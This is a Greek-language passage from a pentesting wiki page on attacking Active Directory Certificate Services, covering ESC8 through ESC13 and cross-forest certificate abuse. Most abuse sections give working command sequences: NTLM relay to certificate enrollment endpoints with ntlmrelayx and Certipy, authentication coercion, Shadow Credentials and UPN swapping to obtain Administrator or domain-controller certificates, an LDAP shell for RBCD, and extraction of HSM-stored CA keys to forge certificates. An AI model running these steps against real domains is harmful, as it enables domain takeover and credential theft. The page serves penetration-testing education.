Πολλές **μεθόδοι εγγραφής βασισμένες σε HTTP** υποστηρίζονται από το AD CS, οι οποίες είναι διαθέσιμες μέσω επιπλέον ρόλων διακομιστή που μπορεί να εγκαταστήσουν οι διαχειριστές. Αυτές οι διεπαφές για την εγγραφή πιστοποιητικών βασισμένων σε HTTP είναι ευάλωτες σε **επιθέσεις NTLM relay**. Ένας επιτιθέμενος, από μια **κατεστραμμένη μηχανή, μπορεί να προσποιηθεί οποιονδήποτε λογαριασμό AD που πιστοποιείται μέσω εισερχόμενου NTLM**. Ενώ προσποιείται τον λογαριασμό του θύματος, αυτές οι διεπαφές ιστού μπορούν να προσπελαστούν από έναν επιτιθέμενο για να **ζητήσει ένα πιστοποιητικό πιστοποίησης πελάτη χρησιμοποιώντας τα πρότυπα πιστοποιητικών `User` ή `Machine`**.

- Η **διεπαφή εγγραφής ιστού** (μια παλαιότερη εφαρμογή ASP διαθέσιμη στο `http://<caserver>/certsrv/`), προεπιλέγει μόνο HTTP, το οποίο δεν προσφέρει προστασία κατά των επιθέσεων NTLM relay. Επιπλέον, επιτρέπει ρητά μόνο την πιστοποίηση NTLM μέσω της κεφαλίδας Authorization HTTP, καθιστώντας τις πιο ασφαλείς μεθόδους πιστοποίησης όπως το Kerberos μη εφαρμόσιμες.
- Η **Υπηρεσία Εγγραφής Πιστοποιητικών** (CES), η **Πολιτική Εγγραφής Πιστοποιητικών** (CEP) Web Service και η **Υπηρεσία Εγγραφής Δικτυακών Συσκευών** (NDES) υποστηρίζουν προεπιλεγμένα την πιστοποίηση negotiate μέσω της κεφαλίδας Authorization HTTP. Η πιστοποίηση negotiate **υποστηρίζει και** το Kerberos και **NTLM**, επιτρέποντας σε έναν επιτιθέμενο να **υποβαθμίσει την πιστοποίηση σε NTLM** κατά τη διάρκεια επιθέσεων relay. Αν και αυτές οι υπηρεσίες ιστού ενεργοποιούν το HTTPS από προεπιλογή, το HTTPS από μόνο του **δεν προστατεύει από επιθέσεις NTLM relay**. Η προστασία από επιθέσεις NTLM relay για υπηρεσίες HTTPS είναι δυνατή μόνο όταν το HTTPS συνδυάζεται με την δέσμευση καναλιού. Δυστυχώς, το AD CS δεν ενεργοποιεί την Επεκτεταμένη Προστασία για Πιστοποίηση στο IIS, η οποία απαιτείται για την δέσμευση καναλιού.

Ένα κοινό **πρόβλημα** με τις επιθέσεις NTLM relay είναι η **σύντομη διάρκεια των συνεδριών NTLM** και η αδυναμία του επιτιθέμενου να αλληλεπιδράσει με υπηρεσίες που **απαιτούν υπογραφή NTLM**.

Ωστόσο, αυτός ο περιορισμός ξεπερνιέται εκμεταλλευόμενος μια επίθεση NTLM relay για να αποκτήσει ένα πιστοποιητικό για τον χρήστη, καθώς η διάρκεια ισχύος του πιστοποιητικού καθορίζει τη διάρκεια της συνεδρίας, και το πιστοποιητικό μπορεί να χρησιμοποιηθεί με υπηρεσίες που **επιβάλλουν υπογραφή NTLM**. Για οδηγίες σχετικά με τη χρήση ενός κλεμμένου πιστοποιητικού, ανατρέξτε σε:

{{#ref}}
account-persistence.md
{{#endref}}

Ένας άλλος περιορισμός των επιθέσεων NTLM relay είναι ότι **μια μηχανή που ελέγχεται από τον επιτιθέμενο πρέπει να πιστοποιηθεί από έναν λογαριασμό θύματος**. Ο επιτιθέμενος θα μπορούσε είτε να περιμένει είτε να προσπαθήσει να **επιβάλει** αυτή την πιστοποίηση:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Κατάχρηση**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` καταγράφει **ενεργοποιημένα HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από τις επιχειρηματικές Αρχές Πιστοποίησης (CAs) για να αποθηκεύει τα σημεία τερματισμού Υπηρεσίας Εγγραφής Πιστοποιητικών (CES). Αυτά τα σημεία τερματισμού μπορούν να αναλυθούν και να καταγραφούν χρησιμοποιώντας το εργαλείο **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Κατάχρηση με το Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Κατάχρηση με [Certipy](https://github.com/ly4k/Certipy)

Το αίτημα για ένα πιστοποιητικό γίνεται από το Certipy από προεπιλογή με βάση το πρότυπο `Machine` ή `User`, που καθορίζεται από το αν το όνομα του λογαριασμού που αναμεταδίδεται τελειώνει σε `$`. Η καθορισμός ενός εναλλακτικού προτύπου μπορεί να επιτευχθεί μέσω της χρήσης της παραμέτρου `-template`.

Μια τεχνική όπως [PetitPotam](https://github.com/ly4k/PetitPotam) μπορεί στη συνέχεια να χρησιμοποιηθεί για να εξαναγκάσει την αυθεντικοποίηση. Όταν ασχολείστε με ελεγκτές τομέα, απαιτείται ο καθορισμός `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Εξήγηση

Η νέα τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για **`msPKI-Enrollment-Flag`**, που αναφέρεται ως ESC9, αποτρέπει την ενσωμάτωση της **νέας `szOID_NTDS_CA_SECURITY_EXT` ασφάλειας** σε ένα πιστοποιητικό. Αυτή η σημαία γίνεται σχετική όταν το `StrongCertificateBindingEnforcement` είναι ρυθμισμένο σε `1` (η προεπιλεγμένη ρύθμιση), κάτι που αντιτίθεται σε μια ρύθμιση `2`. Η σημασία της αυξάνεται σε σενάρια όπου μια πιο αδύναμη αντιστοίχιση πιστοποιητικού για Kerberos ή Schannel θα μπορούσε να εκμεταλλευτεί (όπως στο ESC10), δεδομένου ότι η απουσία του ESC9 δεν θα άλλαζε τις απαιτήσεις.

Οι συνθήκες υπό τις οποίες η ρύθμιση αυτής της σημαίας γίνεται σημαντική περιλαμβάνουν:

- Το `StrongCertificateBindingEnforcement` δεν έχει ρυθμιστεί σε `2` (με την προεπιλεγμένη να είναι `1`), ή οι `CertificateMappingMethods` περιλαμβάνουν τη σημαία `UPN`.
- Το πιστοποιητικό είναι σημειωμένο με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` εντός της ρύθμισης `msPKI-Enrollment-Flag`.
- Οποιοδήποτε EKU πιστοποίησης πελάτη καθορίζεται από το πιστοποιητικό.
- Οι άδειες `GenericWrite` είναι διαθέσιμες σε οποιονδήποτε λογαριασμό για να συμβιβαστεί άλλος.

### Σενάριο Κατάχρησης

Ας υποθέσουμε ότι ο `John@corp.local` κατέχει άδειες `GenericWrite` πάνω στον `Jane@corp.local`, με στόχο να συμβιβάσει τον `Administrator@corp.local`. Το πρότυπο πιστοποιητικού `ESC9`, στο οποίο επιτρέπεται η εγγραφή του `Jane@corp.local`, είναι ρυθμισμένο με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` στην ρύθμιση `msPKI-Enrollment-Flag`.

Αρχικά, το hash του `Jane` αποκτάται χρησιμοποιώντας Shadow Credentials, χάρη στον `GenericWrite` του `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, παραλείποντας σκόπιμα το μέρος του τομέα `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Αυτή η τροποποίηση δεν παραβιάζει τους περιορισμούς, δεδομένου ότι το `Administrator@corp.local` παραμένει διακριτό ως το `userPrincipalName` του `Administrator`.

Ακολουθώντας αυτό, το πρότυπο πιστοποιητικού `ESC9`, που έχει χαρακτηριστεί ευάλωτο, ζητείται ως `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Σημειώνεται ότι το `userPrincipalName` του πιστοποιητικού αντικατοπτρίζει τον `Administrator`, χωρίς κανένα “object SID”.

Το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική της, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η προσπάθεια αυθεντικοποίησης με το εκδοθέν πιστοποιητικό αποδίδει τώρα το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει `-domain <domain>` λόγω της έλλειψης καθορισμού τομέα στο πιστοποιητικό:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Αδύνατοι Χάρτες Πιστοποιητικών - ESC10

### Εξήγηση

Δύο τιμές κλειδιών μητρώου στον ελεγκτή τομέα αναφέρονται από το ESC10:

- Η προεπιλεγμένη τιμή για το `CertificateMappingMethods` κάτω από `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` είναι `0x18` (`0x8 | 0x10`), προηγουμένως ρυθμισμένη σε `0x1F`.
- Η προεπιλεγμένη ρύθμιση για το `StrongCertificateBindingEnforcement` κάτω από `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` είναι `1`, προηγουμένως `0`.

**Περίπτωση 1**

Όταν το `StrongCertificateBindingEnforcement` είναι ρυθμισμένο σε `0`.

**Περίπτωση 2**

Εάν το `CertificateMappingMethods` περιλαμβάνει το bit `UPN` (`0x4`).

### Περίπτωση Κατάχρησης 1

Με το `StrongCertificateBindingEnforcement` ρυθμισμένο σε `0`, ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να εκμεταλλευτεί για να συμβιβάσει οποιονδήποτε λογαριασμό B.

Για παράδειγμα, έχοντας δικαιώματα `GenericWrite` πάνω από `Jane@corp.local`, ένας επιτιθέμενος στοχεύει να συμβιβάσει το `Administrator@corp.local`. Η διαδικασία αντικατοπτρίζει το ESC9, επιτρέποντας τη χρήση οποιουδήποτε προτύπου πιστοποιητικού.

Αρχικά, το hash της `Jane` ανακτάται χρησιμοποιώντας Shadow Credentials, εκμεταλλευόμενο το `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, παραλείποντας σκόπιμα το τμήμα `@corp.local` για να αποφευχθεί μια παραβίαση περιορισμού.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ακολουθώντας αυτό, ζητείται ένα πιστοποιητικό που επιτρέπει την πιστοποίηση πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Η `userPrincipalName` της `Jane` επαναφέρεται στην αρχική της, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η πιστοποίηση με το αποκτηθέν πιστοποιητικό θα αποφέρει το NT hash του `Administrator@corp.local`, απαιτώντας τον καθορισμό του τομέα στην εντολή λόγω της απουσίας λεπτομερειών τομέα στο πιστοποιητικό.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Με το `CertificateMappingMethods` να περιέχει το `UPN` bit flag (`0x4`), ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να συμβιβάσει οποιονδήποτε λογαριασμό B που στερείται ιδιότητας `userPrincipalName`, συμπεριλαμβανομένων των λογαριασμών μηχανών και του ενσωματωμένου τοπικού διαχειριστή τομέα `Administrator`.

Εδώ, ο στόχος είναι να συμβιβαστεί το `DC$@corp.local`, ξεκινώντας με την απόκτηση του hash της `Jane` μέσω Shadow Credentials, εκμεταλλευόμενοι το `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Η `userPrincipalName` της `Jane` ρυθμίζεται σε `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ένα πιστοποιητικό για την πιστοποίηση πελάτη ζητείται ως `Jane` χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Η `userPrincipalName` της `Jane` επανέρχεται στην αρχική της κατάσταση μετά από αυτή τη διαδικασία.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Για να αυθεντικοποιηθεί μέσω Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, υποδεικνύοντας την επιτυχία της αυθεντικοποίησης ως `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Μέσω του LDAP shell, εντολές όπως το `set_rbcd` επιτρέπουν επιθέσεις Resource-Based Constrained Delegation (RBCD), ενδεχομένως θέτοντας σε κίνδυνο τον ελεγκτή τομέα.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Αυτή η ευπάθεια επεκτείνεται επίσης σε οποιονδήποτε λογαριασμό χρήστη που δεν έχει `userPrincipalName` ή όπου δεν ταιριάζει με το `sAMAccountName`, με τον προεπιλεγμένο `Administrator@corp.local` να είναι ένας κύριος στόχος λόγω των ανυψωμένων LDAP δικαιωμάτων του και της απουσίας `userPrincipalName` από προεπιλογή.

## Relaying NTLM to ICPR - ESC11

### Εξήγηση

Εάν ο CA Server δεν είναι ρυθμισμένος με `IF_ENFORCEENCRYPTICERTREQUEST`, μπορεί να πραγματοποιηθούν επιθέσεις NTLM relay χωρίς υπογραφή μέσω της υπηρεσίας RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Μπορείτε να χρησιμοποιήσετε το `certipy` για να καταγράψετε αν η `Enforce Encryption for Requests` είναι απενεργοποιημένη και το certipy θα δείξει τις ευπάθειες `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Σενάριο Κατάχρησης

Πρέπει να ρυθμιστεί ένας διακομιστής αναμετάδοσης:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Σημείωση: Για τους ελεγκτές τομέα, πρέπει να καθορίσουμε `-template` στο DomainController.

Ή χρησιμοποιώντας [το fork του sploutchy από το impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Οι διαχειριστές μπορούν να ρυθμίσουν την Αρχή Πιστοποίησης για να την αποθηκεύσουν σε μια εξωτερική συσκευή όπως το "Yubico YubiHSM2".

Εάν η συσκευή USB είναι συνδεδεμένη στον διακομιστή CA μέσω μιας θύρας USB, ή σε περίπτωση που ο διακομιστής CA είναι μια εικονική μηχανή, απαιτείται ένα κλειδί αυθεντικοποίησης (μερικές φορές αναφέρεται ως "κωδικός πρόσβασης") για να μπορέσει ο Παροχέας Αποθήκευσης Κλειδιών να δημιουργήσει και να χρησιμοποιήσει κλειδιά στο YubiHSM.

Αυτό το κλειδί/κωδικός πρόσβασης αποθηκεύεται στο μητρώο κάτω από `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` σε καθαρό κείμενο.

Αναφορά [εδώ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Εάν το ιδιωτικό κλειδί της CA είναι αποθηκευμένο σε μια φυσική συσκευή USB όταν αποκτήσετε πρόσβαση στο shell, είναι δυνατόν να ανακτηθεί το κλειδί.

Αρχικά, πρέπει να αποκτήσετε το πιστοποιητικό CA (αυτό είναι δημόσιο) και στη συνέχεια:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Τέλος, χρησιμοποιήστε την εντολή certutil `-sign` για να πλαστογραφήσετε ένα νέο αυθαίρετο πιστοποιητικό χρησιμοποιώντας το πιστοποιητικό CA και το ιδιωτικό του κλειδί.

## OID Group Link Abuse - ESC13

### Εξήγηση

Το χαρακτηριστικό `msPKI-Certificate-Policy` επιτρέπει την προσθήκη της πολιτικής έκδοσης στο πρότυπο πιστοποιητικού. Τα αντικείμενα `msPKI-Enterprise-Oid` που είναι υπεύθυνα για την έκδοση πολιτικών μπορούν να ανακαλυφθούν στο Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) του κοντέινερ PKI OID. Μια πολιτική μπορεί να συνδεθεί με μια ομάδα AD χρησιμοποιώντας το χαρακτηριστικό `msDS-OIDToGroupLink` αυτού του αντικειμένου, επιτρέποντας σε ένα σύστημα να εξουσιοδοτήσει έναν χρήστη που παρουσιάζει το πιστοποιητικό σαν να ήταν μέλος της ομάδας. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Με άλλα λόγια, όταν ένας χρήστης έχει άδεια να εγγραφεί σε ένα πιστοποιητικό και το πιστοποιητικό είναι συνδεδεμένο με μια ομάδα OID, ο χρήστης μπορεί να κληρονομήσει τα προνόμια αυτής της ομάδας.

Χρησιμοποιήστε [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) για να βρείτε OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Σενάριο Κατάχρησης

Βρείτε μια άδεια χρήστη που μπορεί να χρησιμοποιήσει `certipy find` ή `Certify.exe find /showAllPermissions`.

Αν ο `John` έχει άδεια να εγγραφεί στο `VulnerableTemplate`, ο χρήστης μπορεί να κληρονομήσει τα προνόμια της ομάδας `VulnerableGroup`.

Το μόνο που χρειάζεται να κάνει είναι να καθορίσει το πρότυπο, θα αποκτήσει ένα πιστοποιητικό με δικαιώματα OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Συμβιβασμός Δασών με Πιστοποιητικά Εξηγούμενα σε Παθητική Φωνή

### Σπάσιμο Δεσμών Δασών από Συμβιβασμένες CA

Η ρύθμιση για **διασυνοριακή εγγραφή** είναι σχετικά απλή. Το **πιστοποιητικό ρίζας CA** από το δάσος πόρων **δημοσιεύεται στα δάση λογαριασμών** από τους διαχειριστές, και τα **πιστοποιητικά CA επιχείρησης** από το δάσος πόρων **προστίθενται στα `NTAuthCertificates` και AIA containers σε κάθε δάσος λογαριασμού**. Για να διευκρινιστεί, αυτή η ρύθμιση παρέχει στον **CA στο δάσος πόρων πλήρη έλεγχο** σε όλα τα άλλα δάση για τα οποία διαχειρίζεται το PKI. Εάν αυτή η CA **συμβιβαστεί από επιτιθέμενους**, τα πιστοποιητικά για όλους τους χρήστες και στα δύο δάση, πόρων και λογαριασμών, θα μπορούσαν να **παραποιηθούν από αυτούς**, σπάζοντας έτσι το όριο ασφαλείας του δάσους.

### Δικαιώματα Εγγραφής που Χορηγούνται σε Ξένους Πρίγκιπες

Σε περιβάλλοντα πολλών δασών, απαιτείται προσοχή όσον αφορά τις CA επιχείρησης που **δημοσιεύουν πρότυπα πιστοποιητικών** που επιτρέπουν **Επικυρωμένους Χρήστες ή ξένους πρίγκιπες** (χρήστες/ομάδες εξωτερικές στο δάσος στο οποίο ανήκει η CA επιχείρησης) **δικαιώματα εγγραφής και επεξεργασίας**.\
Μετά την επικύρωση μέσω ενός δεσμού, το **SID Επικυρωμένων Χρηστών** προστίθεται στο διακριτικό του χρήστη από το AD. Έτσι, εάν ένα domain διαθέτει μια CA επιχείρησης με ένα πρότυπο που **επιτρέπει δικαιώματα εγγραφής στους Επικυρωμένους Χρήστες**, ένα πρότυπο θα μπορούσε δυνητικά να **εγγραφεί από έναν χρήστη από ένα διαφορετικό δάσος**. Ομοίως, εάν **δικαιώματα εγγραφής χορηγούνται ρητά σε έναν ξένο πρίγκιπα από ένα πρότυπο**, δημιουργείται έτσι μια **διασυνοριακή σχέση ελέγχου πρόσβασης**, επιτρέποντας σε έναν πρίγκιπα από ένα δάσος να **εγγραφεί σε ένα πρότυπο από ένα άλλο δάσος**.

Και οι δύο περιπτώσεις οδηγούν σε μια **αύξηση της επιφάνειας επίθεσης** από το ένα δάσος στο άλλο. Οι ρυθμίσεις του προτύπου πιστοποιητικού θα μπορούσαν να εκμεταλλευτούν από έναν επιτιθέμενο για να αποκτήσουν επιπλέον προνόμια σε ένα ξένο domain.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../../banners/hacktricks-training.md}}
